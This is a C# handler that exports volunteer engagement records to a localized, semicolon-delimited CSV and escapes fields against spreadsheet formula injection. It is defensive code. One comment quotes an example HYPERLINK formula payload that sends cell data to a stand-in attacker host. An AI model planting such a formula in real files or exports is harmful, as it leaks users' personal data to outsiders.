using System.Globalization;
using System.Text;
using Application.Common.Authorization;
using Application.Common.Exceptions;
using Application.Common.Keycloak;
using Application.Common.Localization;
using Application.Common.Messaging;
using Application.Common.Persistence;
using Domain.Primitives;

namespace Application.Engagements.ExportEngagements.v1;

internal sealed class ExportEngagementsQueryHandler(
	IEngagementReadRepository readRepository,
	IApplicationDbContext dbContext,
	IKeycloakUserService keycloakUserService)
	: IQueryHandler<ExportEngagementsQuery, EngagementExportFile>
{
	private static readonly TimeZoneInfo BerlinTimeZone = TimeZoneInfo.FindSystemTimeZoneById("Europe/Berlin");

	public async ValueTask<EngagementExportFile> Handle(
		ExportEngagementsQuery request,
		CancellationToken cancellationToken = default)
	{
		var opportunity = await dbContext.VolunteerOpportunities.FindAsync(request.OpportunityId, cancellationToken)
			?? throw new ResultFailureException(Error.NotFound("VolunteerOpportunity.NotFound", $"Volunteer opportunity '{request.OpportunityId.Value}' not found."));

		await OwnershipGuard.EnsureIsOrganizerAsync(
			dbContext,
			opportunity.OrganizationId.Value,
			request.RequestingUserId,
			cancellationToken);

		var engagements = await readRepository.GetForExportAsync(request.OpportunityId, cancellationToken);

		var volunteerIds = engagements
			.Where(e => e.VolunteerId is not null)
			.Select(e => e.VolunteerId!.Value)
			.Distinct()
			.ToList();
		var profileMap = await keycloakUserService.GetUserProfilesAsync(volunteerIds, cancellationToken);

		var requestingUser = (await dbContext.GetOrCreateUsersAsync([request.RequestingUserId], cancellationToken))[0];
		var language = SupportedLanguages.Resolve(requestingUser.PreferredLanguage);

		var content = BuildCsv(engagements, profileMap, language);
		return new EngagementExportFile($"engagements-{request.OpportunityId.Value}.csv", content);
	}

	private static string BuildCsv(
		List<EngagementSummary> engagements,
		IReadOnlyDictionary<Guid, KeycloakUserProfile> profileMap,
		string language)
	{
		const string delimiter = ";";

		// CRLF line endings explicitly (RFC 4180), not StringBuilder.AppendLine's
		// Environment.NewLine - a CSV built on Linux CI must byte-for-byte match
		// one built on a Windows dev machine, and Excel/other spreadsheet tools
		// expect CRLF regardless of which OS generated the file.
		var sb = new StringBuilder();

		// Excel honors this directive line regardless of the running install's own
		// regional list-separator setting (#1675) - without it, a German Windows
		// Excel expecting ";" silently collapses a comma-delimited file into a
		// single column. Emitted unconditionally, with the delimiter itself
		// switched to ";" to match, so this fixes the German case without
		// affecting how an English-locale Excel reads the same file.
		sb.Append("sep=;\r\n");
		sb.Append(string.Join(delimiter, Header(language))).Append("\r\n");

		foreach (var e in engagements)
		{
			var row = new[]
			{
				ResolveName(e, profileMap, language),
				TranslateStatus(e.Status, language),
				FormatTimeSlot(e.TimeSlotStartDateTime, e.TimeSlotEndDateTime),
				e.IsCheckedIn ? CheckedInLabel(language) : NotCheckedInLabel(language),
				e.FeedbackRating?.ToString(CultureInfo.InvariantCulture) ?? "",
			};
			sb.Append(string.Join(delimiter, row.Select(v => CsvEscape(v, delimiter)))).Append("\r\n");
		}

		return sb.ToString();
	}

	// The time slot column names its zone explicitly rather than per-row (see
	// FormatBerlinTime) - simpler than a per-row MEZ/MESZ abbreviation and just
	// as unambiguous.
	private static string[] Header(string language) => language == "de"
		? ["Name", "Status", "Zeitslot (Europe/Berlin)", "Check-in-Status", "Feedback-Bewertung"]
		: ["Name", "Status", "Time Slot (Europe/Berlin)", "Check-in Status", "Feedback Rating"];

	private static string TranslateStatus(string status, string language) => language == "de"
		? status switch
		{
			"Pending" => "Ausstehend",
			"Confirmed" => "Bestätigt",
			"Cancelled" => "Abgesagt",
			"Withdrawn" => "Zurückgezogen",
			_ => status,
		}
		: status;

	private static string CheckedInLabel(string language) => language == "de" ? "Eingecheckt" : "Checked in";

	private static string NotCheckedInLabel(string language) => language == "de" ? "Nicht eingecheckt" : "Not checked in";

	private static string ResolveName(
		EngagementSummary e, IReadOnlyDictionary<Guid, KeycloakUserProfile> profileMap, string language)
	{
		if (e.VolunteerId is not Guid volunteerId)
			return language == "de" ? "Anonymisierte:r Freiwillige:r" : "Anonymized volunteer";

		if (!profileMap.TryGetValue(volunteerId, out var profile))
			return FallbackVolunteerLabel(volunteerId, language);

		var name = profile.FirstName is not null || profile.LastName is not null
			? $"{profile.FirstName} {profile.LastName}".Trim()
			: profile.Username;

		return string.IsNullOrWhiteSpace(name) ? FallbackVolunteerLabel(volunteerId, language) : name;
	}

	private static string FallbackVolunteerLabel(Guid volunteerId, string language) =>
		language == "de" ? $"Freiwillige:r {volunteerId}" : $"Volunteer {volunteerId}";

	private static string FormatTimeSlot(DateTimeOffset? start, DateTimeOffset? end)
	{
		if (start is null)
			return "";

		var startText = FormatBerlinTime(start.Value);
		if (end is null)
			return startText;

		return $"{startText} - {FormatBerlinTime(end.Value)}";
	}

	// No per-opportunity timezone is stored (same Europe/Berlin fallback used
	// throughout this codebase - see EngagementReminderDueHandler.FormatStart's
	// own comment) - converts from UTC rather than leaving it raw, since that's
	// what an organizer's own browser (defaulting to its local timezone, almost
	// always this one for this product's userbase) already shows them on screen.
	private static string FormatBerlinTime(DateTimeOffset instant) =>
		TimeZoneInfo.ConvertTime(instant, BerlinTimeZone).ToString("yyyy-MM-dd HH:mm", CultureInfo.InvariantCulture);

	// Spreadsheet apps (Excel, LibreOffice, Google Sheets) treat a cell starting
	// with =, +, -, @, tab, or CR as a formula to evaluate (CWE-1236) - the Name
	// column is built from a volunteer's Keycloak first/last name (ResolveName
	// above), which is fully caller-controlled free text, e.g.
	// =HYPERLINK("https://attacker.example/?d="&A2,"click") (#1678). Prefixing
	// with a single quote forces the cell to be read as literal text instead.
	private static readonly char[] FormulaInjectionLeadChars = ['=', '+', '-', '@', '\t', '\r'];

	// RFC 4180: only quote (and escape embedded quotes in) a field that actually
	// needs it - a volunteer's name could contain the delimiter, a quote, or a
	// newline that would otherwise break the CSV's column boundaries.
	private static string CsvEscape(string value, string delimiter)
	{
		var sanitized = value.Length > 0 && FormulaInjectionLeadChars.Contains(value[0])
			? $"'{value}"
			: value;

		if (sanitized.IndexOfAny(['"', '\n', '\r']) < 0 && !sanitized.Contains(delimiter))
			return sanitized;

		return $"\"{sanitized.Replace("\"", "\"\"")}\"";
	}
}
